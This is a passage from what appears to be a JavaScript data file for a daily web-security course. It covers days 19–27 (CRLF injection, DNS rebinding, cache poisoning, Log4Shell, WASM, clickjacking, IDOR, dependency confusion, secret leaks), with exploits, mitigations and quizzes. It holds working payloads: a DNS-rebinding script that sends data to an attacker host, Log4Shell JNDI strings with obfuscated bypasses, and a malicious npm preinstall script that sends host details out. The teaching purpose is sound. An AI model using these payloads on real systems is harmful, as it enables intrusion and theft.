      { q: "Server-side prototype pollution in Node.js can lead to:", options: ["Client-side XSS only", "Remote Code Execution via polluted properties used in child_process or template engines", "DNS poisoning", "SSL stripping"], answer: 1 }
    ]
  },
  {
    day: 19,
    date: "2026-07-12",
    title: "HTTP Response Splitting & Header Injection",
    severity: "MEDIUM",
    category: "Protocol Attacks",
    icon: "📨",
    definition: "HTTP response splitting occurs when unvalidated user input containing CR/LF characters (\\r\\n) is included in HTTP response headers. This allows attackers to inject arbitrary HTTP headers, split the response into two, perform XSS, cache poisoning, or redirect users.",
    theory: `HTTP headers are delimited by \\r\\n (CRLF). If user input is reflected in a response header without encoding, an attacker can inject \\r\\n to terminate the current header and add new ones — or split the response entirely.

**Attack chains:**
- **Header injection**: Inject Set-Cookie, Location, or X-* headers
- **Response splitting**: Inject full headers + blank line + body to create a second HTTP response
- **Cache poisoning**: Poison the response cache with injected content
- **XSS via injected body**: Inject HTML/JS in a split response
- **Session fixation via Set-Cookie injection**`,
    cve: [
      { id: "CVE-2020-26217", name: "XStream Header Injection", desc: "XStream deserialization leading to response header injection." },
      { id: "CVE-2021-33813", name: "jdom2 Response Splitting", desc: "JDOM2 XML library allowing CRLF injection via XML processing." }
    ],
    exploit: `**Basic header injection via Location:**
\`\`\`http
# Vulnerable redirect:
GET /redirect?url=https://example.com HTTP/1.1

# Inject via url parameter:
GET /redirect?url=https://example.com%0d%0aSet-Cookie:%20session=hijacked

# Result:
HTTP/1.1 302 Found
Location: https://example.com
Set-Cookie: session=hijacked   ← Injected!
\`\`\`

**Response splitting (old servers):**
\`\`\`
url=evil%0d%0a%0d%0a<html><script>alert(1)</script></html>

# Creates two responses — second one has injected HTML
\`\`\`

**Cache poisoning via injected headers:**
\`\`\`
GET /page?lang=en%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<h1>Poisoned</h1>
\`\`\`

**Session fixation via Set-Cookie injection:**
\`\`\`
GET /login?redirect=home%0d%0aSet-Cookie:%20sessionid=ATTACKER_SESSION;%20Path=/

# Victim follows this URL → server sets attacker's session ID
# Victim logs in → attacker's session is now authenticated!
\`\`\`

**Testing:**
\`\`\`bash
# Inject CRLF in all parameters that appear in response headers
# Look for Location, Content-Type, Set-Cookie reflection
curl -v "http://victim.com/redirect?url=test%0d%0aX-Injected:%20yes"
\`\`\``,
    tools: ["Burp Suite", "CRLFuzz", "OWASP ZAP"],
    mitigation: "Strip \\r\\n characters from all user input before including in headers. Use framework functions that properly encode header values. Never reflect raw user input in HTTP response headers.",
    quiz: [
      { q: "HTTP Response Splitting uses which special characters to inject new headers?", options: ["<script>", "' OR 1=1 --", "\\r\\n (CRLF)", "../.."], answer: 2 },
      { q: "What URL encoding represents CRLF for injection in HTTP parameters?", options: ["%0a%0a", "%0d%0a", "%20%20", "%3c%3e"], answer: 1 },
      { q: "Session fixation via header injection involves injecting which HTTP header?", options: ["Authorization", "Content-Type", "Set-Cookie", "Accept-Language"], answer: 2 },
      { q: "HTTP Response Splitting is primarily a risk when user input is reflected in:", options: ["HTML body content", "JavaScript variables", "HTTP response headers", "SQL queries"], answer: 2 },
      { q: "What best practice prevents CRLF injection at the framework level?", options: ["Using HTTPS", "Stripping \\r and \\n from input before using it in headers", "Adding CSRF tokens", "Encoding HTML entities"], answer: 1 }
    ]
  },
  {
    day: 20,
    date: "2026-07-13",
    title: "DNS Rebinding",
    severity: "HIGH",
    category: "Browser & Network Attacks",
    icon: "🔀",
    definition: "DNS rebinding is an attack that abuses the browser's same-origin policy by causing a domain to resolve to different IP addresses over time. An attacker's page first loads from the attacker's IP, then DNS is changed to resolve to 127.0.0.1 or an internal IP — allowing the malicious script to make cross-origin requests to internal services.",
    theory: `Same-origin policy prevents JavaScript from domain A accessing domain B. But the SOP uses the domain name, not the IP. DNS rebinding exploits this:

1. Victim visits attacker.com → browser resolves to attacker's real IP (serve malicious JS)
2. Attacker's DNS TTL is very short (1 second)
3. JS tries to re-access attacker.com → DNS resolves to 192.168.1.1 (internal router)
4. Browser allows it (same origin = attacker.com) → JS can now query internal services!

**Real-world targets:**
- Home router admin interfaces
- Local development servers (localhost:3000, localhost:8080)
- IoT devices on local network
- Internal corporate services
- Docker/Kubernetes internal services`,
    cve: [
      { id: "CVE-2019-5482", name: "curl DNS rebinding", desc: "DNS rebinding affecting curl's SSRF protections." },
      { id: "CVE-2022-2094", name: "Google Chrome DNS rebinding protection bypass", desc: "Chromium DNS rebinding mitigation bypass via IPv6 address resolution." }
    ],
    exploit: `**Attack setup:**
1. Register: attacker.com
2. Configure custom DNS server with TTL=1s
3. DNS responds with attacker's real IP initially
4. After victim loads page, change DNS to point to internal IP (192.168.1.1)

**Malicious JavaScript payload:**
\`\`\`javascript
// Step 1: Run on attacker's IP first
// Step 2: After rebinding, this hits internal network
async function rebindAttack() {
  // Fetch local router admin page
  const resp = await fetch('http://attacker.com/admin');  // attacker.com now = 192.168.1.1
  const html = await resp.text();
  
  // Extract data and exfil
  await fetch('https://real-attacker.com/steal?data=' + encodeURIComponent(html));
}

// Retry loop to wait for rebinding
setInterval(rebindAttack, 2000);
\`\`\`

**Singularity DNS rebinding tool:**
\`\`\`bash
# Tool that automates DNS rebinding attacks
# https://github.com/nccgroup/singularity
./singularity.go -lport 8080 -rhost 192.168.1.1 -rport 80
\`\`\`

**Testing local services:**
\`\`\`bash
# Check if local service has auth
curl -s http://localhost:8080/api/config

# If no auth → vulnerable to DNS rebinding via browser
\`\`\``,
    tools: ["Singularity (nccgroup)", "rebinder.net", "Burp Collaborator", "Custom DNS server"],
    mitigation: "Validate Host header on internal services. Use HTTPS with pinned certificates. Implement authentication on local services. Browsers can implement DNS rebinding protection. Use private DNS split horizon.",
    quiz: [
      { q: "DNS rebinding exploits which browser security mechanism?", options: ["CORS", "Same-Origin Policy", "CSP", "HSTS"], answer: 1 },
      { q: "Why does a very short DNS TTL (1 second) help a DNS rebinding attack?", options: ["It speeds up the attack", "It forces browsers to re-resolve DNS quickly, enabling the IP swap", "It bypasses HTTPS", "It prevents logging"], answer: 1 },
      { q: "What is the key step that makes DNS rebinding bypass SOP?", options: ["Sending cookies cross-origin", "The browser trusts the domain name, not the IP — so same domain with different IPs is still 'same origin'", "Injecting JavaScript into DNS responses", "Using DNSSEC"], answer: 1 },
      { q: "Which local service is a common DNS rebinding target for home networks?", options: ["Gmail", "Router admin interface (192.168.1.1)", "CDN servers", "Public APIs"], answer: 1 },
      { q: "What mitigation on internal/local services prevents DNS rebinding exploitation?", options: ["Using XML instead of JSON", "Validating the Host header and requiring authentication", "Using longer DNS TTLs", "Blocking JavaScript"], answer: 1 }
    ]
  },
  {
    day: 21,
    date: "2026-07-14",
    title: "Cache Poisoning",
    severity: "HIGH",
    category: "Web Cache Attacks",
    icon: "💾",
    definition: "Web cache poisoning is an attack where an attacker manipulates a shared web cache (CDN, reverse proxy, or application cache) to serve malicious responses to other users. By injecting malicious content into cached responses, the attacker can achieve XSS, redirect attacks, or DoS at scale.",
    theory: `Web caches store responses keyed by URL + certain headers (cache key). Other headers (unkeyed) influence the response but aren't part of the key. If unkeyed headers are reflected in the response, attackers can inject malicious content that gets cached and served to all users.

**Cache key components (typically):**
- Host header
- URL path
- Query string

**Unkeyed inputs (commonly):**
- X-Forwarded-Host
- X-Forwarded-For
- X-Host
- X-Original-URL

**Attack types:**
- **Response header injection**: Inject JS via unkeyed headers → cached → served to all
- **Cache deception**: Trick cache into storing sensitive user data
- **CPDoS (Cache-Poisoned Denial of Service)**: Make cache store error responses`,
    cve: [
      { id: "CVE-2018-6389", name: "WordPress load-scripts.php DoS", desc: "Cache poisoning via parameter abuse causing resource exhaustion, widely exploited." },
      { id: "CVE-2022-48432", name: "Varnish Cache Poisoning", desc: "Varnish CDN cache poisoning via header manipulation." }
    ],
    exploit: `**Step 1: Identify cache headers**
\`\`\`http
GET / HTTP/1.1
Host: victim.com

# Look for in response:
X-Cache: HIT/MISS
Age: 0
CF-Cache-Status: MISS
Via: 1.1 varnish
\`\`\`

**Step 2: Find unkeyed inputs with Param Miner**
\`\`\`
# Burp extension Param Miner → Guess params → find reflected unkeyed headers
\`\`\`

**Step 3: Inject via X-Forwarded-Host:**
\`\`\`http
GET / HTTP/1.1
Host: victim.com
X-Forwarded-Host: evil.com"><script>alert(1)</script>

# If X-Forwarded-Host is reflected in JS imports:
# <script src="//evil.com"><script>alert(1)</script>/static/app.js">
# This gets cached → all users get XSS!
\`\`\`

**Step 4: Cache deception**
\`\`\`
# Victim visits:
https://victim.com/account/profile/app.css

# If app serves profile page (ignoring app.css) and cache stores it:
# Cache key: /account/profile/app.css → cached response has account data
# Attacker visits same URL → gets victim's profile from cache!
\`\`\`

**Web Cache Vulnerability Scanner:**
\`\`\`bash
python3 wcvs.py -u https://victim.com -H "X-Forwarded-Host" -p "xss_payloads.txt"
\`\`\``,
    tools: ["Burp Suite + Param Miner", "Web Cache Vulnerability Scanner (WCVS)", "nuclei cache templates"],
    mitigation: "Don't reflect unkeyed headers in responses. Implement strict cache key policies. Use Vary headers appropriately. Normalize URLs before caching. Disable caching for dynamic/personalized content.",
    quiz: [
      { q: "Cache poisoning is possible when an attacker can influence responses via inputs that are:", options: ["Part of the cache key", "Encrypted in the request", "Not part of the cache key (unkeyed) but reflected in the response", "Sent over UDP"], answer: 2 },
      { q: "Which header is commonly exploited as an unkeyed input for cache poisoning?", options: ["Authorization", "Content-Type", "X-Forwarded-Host", "Accept-Encoding"], answer: 2 },
      { q: "Web cache deception tricks the cache into storing what type of response?", options: ["Error pages", "Sensitive user-specific data (like profile pages)", "Static files only", "404 responses"], answer: 1 },
      { q: "Which Burp Suite extension helps discover unkeyed cache inputs?", options: ["SQLiPy", "Param Miner", "J2EEScan", "Retire.js"], answer: 1 },
      { q: "CPDoS (Cache-Poisoned Denial of Service) achieves DoS by:", options: ["Flooding the server with requests", "Poisoning the cache with error responses served to all users", "Crashing the database", "Exhausting memory"], answer: 1 }
    ]
  },
  {
    day: 22,
    date: "2026-07-15",
    title: "CRLF Injection & Log Injection",
    severity: "MEDIUM",
    category: "Injection",
    icon: "📝",
    definition: "Log injection occurs when user-supplied data is written to application logs without sanitization, allowing attackers to forge log entries, cover their tracks, or inject malicious content. CRLF injection in logs enables attackers to split log lines and inject fake events.",
    theory: `Applications log user activity for auditing and debugging. If log entries include unsanitized user input, attackers can:

**Log injection attacks:**
- **Log forging**: Inject fake log entries to frame another user or cover tracks
- **Log file path traversal**: If logs are read back into the app
- **Log4Shell (CVE-2021-44228)**: The most severe — JNDI lookup in log messages triggered RCE
- **Log injection → XSS**: If logs are displayed in a web UI without encoding
- **CRLF in logs**: Split log lines to create fake entries

**Common logging sinks:**
- Authentication logs (username, IP)
- Search queries
- Error messages
- URL parameters`,
    cve: [
      { id: "CVE-2021-44228", name: "Log4Shell", desc: "log4j2 JNDI lookup in log messages: ${jndi:ldap://attacker.com/exploit} triggered RCE." },
      { id: "CVE-2021-45046", name: "Log4Shell bypass", desc: "Bypass of initial Log4Shell patch using alternate JNDI protocols." },
      { id: "CVE-2022-23302", name: "Log4j JMSSink", desc: "Additional log4j deserialization via JMS appender." }
    ],
    exploit: `**1. Log4Shell (CVE-2021-44228):**
\`\`\`
# In any header that gets logged:
User-Agent: ${jndi:ldap://attacker.com:1389/exploit}
X-Api-Version: ${jndi:ldap://attacker.com/a}
X-Forwarded-For: ${jndi:dns://attacker.com}

# Obfuscated bypasses:
${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.com/a}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/a}
\`\`\`

**2. Log forging via CRLF:**
\`\`\`
# Normal log line:
[2026-07-10] INFO User 'admin' logged in from 192.168.1.1

# Inject via username field:
Username: admin
Logged in successfully\r\n[2026-07-10] ERROR User 'victim' failed login 50 times - LOCKOUT

# Now logs show victim was locked out (not attacker)
\`\`\`

**3. Log injection → XSS in log viewer:**
\`\`\`
Username: <img src=x onerror=alert(document.cookie)>
# If admin views logs in web UI without escaping → XSS on admin
\`\`\`

**Testing for Log4Shell:**
\`\`\`bash
# Use Burp Collaborator URL:
${jndi:ldap://YOUR_COLLAB.burpcollaborator.net/test}

# Or use public scanner:
python3 log4j-scan.py -u https://victim.com
\`\`\``,
    tools: ["log4j-scan", "Burp Collaborator", "JNDI-Exploit-Kit", "interactsh"],
    mitigation: "Sanitize all user input before logging. Encode CR/LF characters. Keep logging libraries updated (Log4j ≥ 2.17.1). Use log4j2.formatMsgNoLookups=true. Display logs in web UIs with proper HTML encoding.",
    quiz: [
      { q: "Log4Shell (CVE-2021-44228) was triggered by log4j2 evaluating which type of expression in log messages?", options: ["SQL queries", "JNDI lookup strings like ${jndi:ldap://}", "XPath expressions", "Regular expressions"], answer: 1 },
      { q: "Log forging via CRLF injection allows attackers to:", options: ["Crash the logging service", "Insert fake log entries to frame others or cover their tracks", "Steal log files", "Encrypt log data"], answer: 1 },
      { q: "Which Log4j configuration setting provides partial mitigation for Log4Shell?", options: ["log4j2.disableJNDI=true", "log4j2.formatMsgNoLookups=true", "log4j2.safeMode=true", "log4j2.blockLDAP=true"], answer: 1 },
      { q: "If application logs are displayed in a web UI without HTML encoding, log injection can lead to:", options: ["SQL injection", "Stored XSS attacking admin users", "Path traversal", "SSRF"], answer: 1 },
      { q: "Which minimum Log4j2 version fully patches Log4Shell?", options: ["2.15.0", "2.16.0", "2.17.1", "2.14.0"], answer: 2 }
    ]
  },
  {
    day: 23,
    date: "2026-07-16",
    title: "WebAssembly Security",
    severity: "MEDIUM",
    category: "Modern Web Attacks",
    icon: "🔩",
    definition: "WebAssembly (WASM) is a binary instruction format enabling near-native performance in browsers. Security concerns include reverse engineering WASM modules, using WASM to evade WAF/XSS filters, obfuscating malicious code, and exploiting memory safety issues inherited from C/C++ compiled to WASM.",
    theory: `WASM runs in a sandboxed environment but introduces security challenges:

**Reverse engineering:** WASM binaries can be decompiled using tools like wasm2wat, Ghidra WASM plugin, or JEB. Client-side secrets (crypto keys, logic) in WASM are not safe.

**WAF evasion:** Malicious payloads can be encoded/decoded via WASM, bypassing WAF pattern matching.

**Memory vulnerabilities:** C/C++ code compiled to WASM retains memory safety bugs (buffer overflows) — though exploitability is limited by WASM's sandbox.

**Supply chain:** Malicious WASM in third-party dependencies can exfiltrate data stealthily.

**Side-channel:** WASM's Spectre-like timing attacks (SharedArrayBuffer).`,
    cve: [
      { id: "CVE-2021-30554", name: "Chrome WASM JIT Vulnerability", desc: "Use-after-free in WebAssembly JIT allowing sandbox escape in Chromium." },
      { id: "CVE-2022-1096", name: "Chrome WASM Type Confusion", desc: "Type confusion in WASM V8 engine allowing arbitrary code execution." }
    ],
    exploit: `**1. Decompile WASM module:**
\`\`\`bash
# Convert WASM binary to WAT (text format)
wasm2wat module.wasm -o module.wat

# OR use wabt toolkit:
wasm-decompile module.wasm

# Look for:
# - Hardcoded API keys
# - Cryptographic constants
# - Business logic (license checks, admin flags)
\`\`\`

**2. Patch WASM binary:**
\`\`\`bash
# Edit WAT file, then recompile:
wat2wasm modified.wat -o patched.wasm

# Use to bypass license checks or admin restrictions
\`\`\`

**3. WAF evasion via WASM:**
\`\`\`javascript
// Load WASM that decodes XSS payload at runtime
// WAF sees no recognizable attack pattern
WebAssembly.instantiateStreaming(fetch('decoder.wasm'))
  .then(obj => {
    const payload = obj.instance.exports.decode('aGVsbG8=');
    eval(payload); // WAF bypass
  });
\`\`\`

**4. Timing side-channel (Spectre-like):**
\`\`\`javascript
// Using SharedArrayBuffer + WASM for precise timing
// Enabled to measure cache states → read other process memory
\`\`\`

**5. Extract WASM from browser:**
\`\`\`bash
# Chrome DevTools → Network tab → filter by "wasm"
# Download the .wasm binary for analysis
\`\`\``,
    tools: ["wasm2wat (wabt)", "Ghidra WASM plugin", "JEB Decompiler", "Binaryen", "wasm-decompile"],
    mitigation: "Never store secrets in WASM/client-side code. Validate all WASM inputs server-side. Keep browser/runtime environments patched. Monitor for unusual WASM network requests. Use CSP to restrict WASM execution sources.",
    quiz: [
      { q: "Which tool converts a WASM binary to readable WAT (WebAssembly Text) format?", options: ["base64decode", "wasm2wat", "xxd", "strings"], answer: 1 },
      { q: "Why is storing API keys or secrets in WASM modules insecure?", options: ["WASM is slower than JavaScript", "WASM binaries can be decompiled and analyzed like any binary", "WASM can't access the network", "WASM files are always encrypted"], answer: 1 },
      { q: "How can WASM be used to evade WAFs?", options: ["WASM requests bypass HTTPS", "Malicious payloads are encoded inside WASM and decoded at runtime, bypassing pattern-based WAF detection", "WASM uses a different TCP port", "WASM disables CSP"], answer: 1 },
      { q: "CVE-2021-30554 was a Chrome vulnerability involving WASM that allowed:", options: ["Session fixation", "Use-after-free in WASM JIT enabling browser sandbox escape", "Password theft", "Certificate forgery"], answer: 1 },
      { q: "How can a penetration tester extract WASM files from a web application?", options: ["Using sqlmap", "Via Chrome DevTools Network tab filtering for .wasm files", "Via Burp Intruder", "Using nmap"], answer: 1 }
    ]
  },
  {
    day: 24,
    date: "2026-07-17",
    title: "Clickjacking",
    severity: "MEDIUM",
    category: "Client-Side Attacks",
    icon: "🖱️",
    definition: "Clickjacking (UI redressing) tricks users into clicking on hidden elements by overlaying a transparent iframe on top of a legitimate website. The user thinks they're interacting with the visible decoy page but is actually clicking buttons on the hidden page — triggering actions like transfers, account changes, or social media posts.",
    theory: `An attacker embeds a victim page in an iframe, makes it transparent (opacity: 0), and positions a decoy button under the hidden real button. When the user clicks the visible button, they actually click the hidden iframe's element.

**Variants:**
- **Classic clickjacking**: Transparent iframe over decoy
- **Cursorjacking**: Custom CSS cursor misleads about actual click position
- **Likejacking**: Facebook Like buttons (social media)
- **Filejacking**: Access to local file system dialogs
- **Drag-and-drop jacking**: Trick user into dragging data into attacker-controlled element

**Prerequisites:**
- Target page must be embeddable (no X-Frame-Options or CSP frame-ancestors)
- Target action must not require CSRF token OR CSRF bypass exists
- No interaction-proof authentication (re-auth for sensitive actions)`,
    cve: [
      { id: "CVE-2019-7548", name: "Microsoft Teams Clickjacking", desc: "Teams settings page vulnerable to clickjacking allowing call/microphone access." },
      { id: "CVE-2021-24884", name: "WordPress Plugin Clickjacking", desc: "Plugin settings vulnerable to clickjacking enabling admin actions." }
    ],
    exploit: `**Classic clickjacking PoC:**
\`\`\`html
<!DOCTYPE html>
<html>
<head>
  <style>
    iframe {
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      opacity: 0.0001;  /* Nearly invisible */
      z-index: 2;
    }
    .decoy-button {
      position: absolute;
      top: 450px; left: 200px;  /* Align with target button */
      z-index: 1;
      padding: 20px;
      background: #f00;
      color: white;
      font-size: 20px;
    }
  </style>
</head>
<body>
  <div class="decoy-button">🎁 Click to claim your prize!</div>
  <iframe src="https://victim.com/account/delete" scrolling="no"></iframe>
</body>
</html>
\`\`\`

**Testing for clickjacking:**
\`\`\`bash
# Check for X-Frame-Options:
curl -I https://victim.com | grep -i "x-frame\|content-security"

# Or in Burp:
# Response → look for:
# X-Frame-Options: DENY / SAMEORIGIN
# Content-Security-Policy: frame-ancestors 'none'/'self'

# No header = potentially vulnerable
\`\`\`

**Bypass frame busters (old JS-based):**
\`\`\`html
<!-- sandbox attribute disables JS frame busters -->
<iframe src="https://victim.com" sandbox="allow-forms allow-scripts allow-same-origin"></iframe>
\`\`\``,
    tools: ["Burp Suite", "ClickjackingTester.com", "OWASP CSRFGuard", "Browser DevTools"],
    mitigation: "Send X-Frame-Options: DENY or SAMEORIGIN. Use Content-Security-Policy: frame-ancestors 'none'. Add re-authentication for sensitive actions. Don't rely on JS frame-busting (can be bypassed with sandbox attribute).",
    quiz: [
      { q: "Clickjacking works by:", options: ["Injecting JS into the victim page", "Overlaying a transparent iframe over a decoy, tricking users into clicking hidden elements", "Stealing session cookies via XSS", "Manipulating DNS resolution"], answer: 1 },
      { q: "Which HTTP header prevents a page from being embedded in iframes?", options: ["Strict-Transport-Security", "X-Content-Type-Options", "X-Frame-Options: DENY", "X-XSS-Protection"], answer: 2 },
      { q: "The modern CSP equivalent of X-Frame-Options is:", options: ["Content-Security-Policy: script-src 'none'", "Content-Security-Policy: frame-ancestors 'none'", "Content-Security-Policy: default-src 'self'", "Content-Security-Policy: sandbox"], answer: 1 },
      { q: "Why doesn't JavaScript frame-busting code reliably prevent clickjacking?", options: ["JS is disabled in modern browsers", "The sandbox attribute on iframes can prevent frame-busting JS from running", "Frame-busting JS is too slow", "Modern browsers don't support JS"], answer: 1 },
      { q: "Likejacking is a variant of clickjacking that specifically targets:", options: ["Login forms", "File upload buttons", "Social media Like/Share buttons", "Search bars"], answer: 2 }
    ]
  },
  {
    day: 25,
    date: "2026-07-18",
    title: "Insecure Direct Object References (Advanced IDOR Chains)",
    severity: "HIGH",
    category: "Authorization",
    icon: "🔗",
    definition: "While you know basic IDOR, advanced IDOR involves chaining vulnerabilities: IDOR + information disclosure, IDOR through indirect references (hashed/encoded IDs), IDOR in APIs via HTTP method switching, mass IDOR via batch endpoints, and privilege escalation chains through multiple IDOR steps.",
    theory: `Advanced IDOR goes beyond simple sequential IDs. Real-world systems often use:

**Indirect references to bypass:**
- UUIDs/GUIDs (still predictable sometimes)
- Hashed IDs (MD5 of ID — find via timing)
- Encrypted IDs (find the encryption key)
- Base64-encoded IDs

**IDOR via non-obvious channels:**
- JSON API paths: /api/v2/users/{id}/profile
- GraphQL node IDs
- WebSocket message IDs
- File download tokens
- Report export IDs
- Email tracking pixels with user IDs

**Chaining IDOR:**
1. IDOR in avatar upload → read other user's avatar → PII
2. Combine with SSRF to fetch internal file via user-controlled URL
3. IDOR in password reset → trigger reset for any user → ATO`,
    cve: [
      { id: "IDOR-ADV-001", name: "Facebook IDOR (2020)", desc: "IDOR in Graph API allowing reading private photos via object IDs." },
      { id: "IDOR-ADV-002", name: "Shopify IDOR (Partners API)", desc: "IDOR in Shopify Partners API allowing store data access across merchants." }
    ],
    exploit: `**1. GUID/UUID IDOR — still worth testing:**
\`\`\`
# UUIDs look random but older UUIDv1 contains timestamp + MAC address
# Try: access /api/users/{other_uuid}/data
# Source: leaked UUIDs in API responses, emails, source code
\`\`\`

**2. Hash-based ID bypass:**
\`\`\`python
import hashlib
# If user ID 123 maps to MD5("123"):
user_id = str(123)
hash_id = hashlib.md5(user_id.encode()).hexdigest()
# → Try /api/user/202cb962ac59075b964b07152d234b70/profile
\`\`\`

**3. HTTP method switching IDOR:**
\`\`\`http
# GET not vulnerable:
GET /api/orders/456 → 403 Forbidden

# Try POST or PUT:
POST /api/orders/456
Content-Type: application/json
{}

# Or HEAD to avoid logging:
HEAD /api/orders/456  → 200 OK (info leak)
\`\`\`

**4. Batch/bulk IDOR:**
\`\`\`http
POST /api/bulk-export
{"user_ids": [1, 2, 3, 4, 5, 999, 1000]}
# If returns data for all IDs including others → mass IDOR
\`\`\`

**5. IDOR → ATO chain:**
\`\`\`
1. Find IDOR in /api/user/{id}/email → change any user's email
2. Trigger password reset to changed email
3. Full account takeover via IDOR chain
\`\`\``,
    tools: ["Burp Suite", "Autorize (Burp extension)", "IDOR-bot", "Arjun"],
    mitigation: "Implement server-side authorization checks for every object access. Use indirect reference maps. Log all authorization failures. Perform code reviews focusing on object-level access control.",
    quiz: [
      { q: "Why are UUID-based IDs not automatically safe from IDOR?", options: ["UUIDs are too short", "UUIDv1 contains timestamp and MAC address, making it predictable; also UUIDs can be leaked in various API responses", "UUIDs are always sequential", "UUIDs are encrypted"], answer: 1 },
      { q: "HTTP method switching in IDOR means:", options: ["Using HTTP/2 instead of HTTP/1.1", "Testing restricted endpoints with different HTTP methods (HEAD, PUT, PATCH) that may have weaker authorization", "Switching between GET and POST randomly", "Using HTTPS instead of HTTP"], answer: 1 },
      { q: "A batch IDOR vulnerability is especially dangerous because:", options: ["It only works on admin accounts", "One request can exfiltrate data for many users simultaneously", "It requires special tools", "It bypasses HTTPS"], answer: 1 },
      { q: "Which Burp Suite extension helps automate testing of authorization issues including IDOR?", options: ["ActiveScan++", "Autorize", "JWT Editor", "Logger++"], answer: 1 },
      { q: "An IDOR-to-ATO chain typically involves:", options: ["Brute-forcing passwords", "Using IDOR to modify another user's email, then triggering password reset to gain full account control", "SQL injection via IDOR parameters", "XSS via IDOR-retrieved data"], answer: 1 }
    ]
  },
  {
    day: 26,
    date: "2026-07-19",
    title: "Dependency Confusion Attack",
    severity: "CRITICAL",
    category: "Supply Chain Attacks",
    icon: "📦",
    definition: "Dependency confusion (also called namespace confusion) is a supply chain attack where an attacker publishes a malicious package to a public registry (npm, PyPI, RubyGems) with the same name as an internal private package. The build system may download the malicious public version instead of the internal one, achieving RCE on developer machines or CI/CD pipelines.",
    theory: `Organizations use internal package registries for proprietary code. When a build system resolves packages, it may check both public and private registries — and if the public registry has a higher version number, it wins.

**Attack vector:**
1. Attacker discovers internal package name (from leaked package.json, error messages, job postings, source code)
2. Publishes same-named package to npm/PyPI with a higher version (e.g., 9.9.9)
3. Build systems fetching from both registries download the malicious public version
4. The package's install script runs on the developer's machine or CI/CD pipeline → RCE

**Discovery methods for internal package names:**
- Leaked package.json/requirements.txt in GitHub
- Error messages in npm install output
- Job postings mentioning internal tooling
- Source code leaks or exposed `.git` repos`,
    cve: [
      { id: "DC-2021-001", name: "Alex Birsan Dependency Confusion", desc: "Researcher earned $130,000+ in bug bounties by uploading packages with internal names, achieving RCE at Apple, PayPal, Microsoft, etc." },
      { id: "CVE-2022-24765", name: "npm Dependency Confusion related", desc: "npm configuration mishandling enabling dependency confusion scenarios." }
    ],
    exploit: `**Step 1: Discover internal package names**
\`\`\`bash
# Search GitHub for leaked package files:
# site:github.com "your-target.com" package.json
# Or look in published Docker images for /app/package.json

# npm error messages:
# "Cannot find module '@company/internal-lib'"
\`\`\`

**Step 2: Create malicious package**
\`\`\`javascript
// package.json
{
  "name": "@company/internal-lib",
  "version": "9.9.9",  // Higher than real internal version
  "description": "Bug bounty research",
  "scripts": {
    "preinstall": "node exploit.js"  // Runs on npm install!
  }
}

// exploit.js - runs on npm install
const os = require('os');
const https = require('https');
const data = JSON.stringify({
  hostname: os.hostname(),
  user: os.userInfo().username,
  platform: os.platform()
});
// Send to bug bounty callback server
https.request({host:'your-callback.com', path:'/?data='+data, method:'GET'}).end();
\`\`\`

**Step 3: Publish to npm**
\`\`\`bash
npm login
npm publish --access public
# Wait for build systems to download it
\`\`\`

**For bug bounty — ethical version:**
\`\`\`javascript
// Just phones home, doesn't execute any harmful commands
// Include your name and bug bounty contact in package
\`\`\``,
    tools: ["npm", "pip", "confused (tool)", "depscan", "pip-audit"],
    mitigation: "Use scoped packages with private registry precedence. Configure npm to only use internal registry for scoped packages. Pin exact versions with lock files. Use namespace blocking. Audit all dependencies with tools like Snyk, npm audit.",
    quiz: [
      { q: "Dependency confusion attacks succeed because:", options: ["Internal packages are unencrypted", "Build systems may prefer public registry packages with higher version numbers over internal ones with the same name", "NPM has no authentication", "Private packages can't be installed"], answer: 1 },
      { q: "The malicious public package published in dependency confusion typically uses a version number that is:", options: ["0.0.1 (very low)", "Exactly the same as internal", "Higher (like 9.9.9) to win version resolution", "Invalid/malformed"], answer: 2 },
      { q: "Which package.json script key allows arbitrary code execution during `npm install`?", options: ["postbuild", "preinstall", "test", "lint"], answer: 1 },
      { q: "Alex Birsan's dependency confusion research primarily targeted which type of infrastructure?", options: ["Public-facing web apps", "Internal developer machines and CI/CD pipelines at major companies", "Mobile applications", "IoT devices"], answer: 1 },
      { q: "The most effective mitigation against dependency confusion is:", options: ["Using older package versions", "Configuring package managers to scope internal packages to private registries only and blocking their names publicly", "Disabling npm", "Only using JavaScript"], answer: 1 }
    ]
  },
  {
    day: 27,
    date: "2026-07-20",
    title: "API Key & Secret Exposure",
    severity: "HIGH",
    category: "Secrets Management",
    icon: "🗝️",
    definition: "API key exposure occurs when sensitive credentials (API keys, OAuth tokens, private keys, database passwords) are accidentally leaked in source code repositories, client-side JavaScript, mobile app binaries, error messages, or HTTP responses — allowing attackers to access services, impersonate the application, or exfiltrate data.",
    theory: `API keys are the most commonly leaked secret type. Developers accidentally commit secrets to Git, include them in client-side code, or expose them in API responses.

**Exposure surfaces:**
- **GitHub/GitLab**: Accidentally committed .env files, config files
- **Client-side JS**: Hardcoded keys in bundled frontend code
- **Mobile apps**: Embedded in APK/IPA binaries (strings extraction)
- **Docker images**: Leaked in image layers or environment variables
- **Error messages**: Stack traces revealing connection strings
- **CI/CD logs**: Build logs printing secret values
- **API responses**: Including internal keys in JSON responses
- **Browser history/cache**: GET requests with API keys in URL`,
    cve: [
      { id: "SECRET-2022-001", name: "Travis CI Secrets Exposure", desc: "Travis CI leaked encrypted environment variables for public repos (500k+)." },
      { id: "SECRET-2023-002", name: "CircleCI Secrets Compromise", desc: "CircleCI security incident exposed customer API tokens stored in CI system." }
    ],
    exploit: `**1. GitHub dorking for secrets:**
\`\`\`
# GitHub advanced search:
"COMPANY_NAME" "api_key" OR "apikey" OR "secret"
filename:.env "DB_PASSWORD"
filename:config.py "AWS_SECRET"
org:target-company "private_key"

# Search in code:
site:github.com "target.com" "apiKey"
\`\`\`

**2. GitLeaks - scan repos:**
\`\`\`bash
gitleaks detect --source . --report-format json
gitleaks detect --source . --redact  # Find but hide values
# Also scan git history:
gitleaks detect --log-opts="HEAD~50..HEAD"
\`\`\`

**3. Client-side JS analysis:**
\`\`\`bash
# Extract secrets from minified JS:
curl https://victim.com/app.bundle.js | grep -oP '(?<=(api_key|apiKey|secret|token|password)["'"'"':\s]{1,5})[A-Za-z0-9/+]{20,}'

# Use js-miner browser extension
\`\`\`

**4. Docker image layer analysis:**
\`\`\`bash
# Download and inspect image layers:
docker pull target/app
docker history target/app --no-trunc
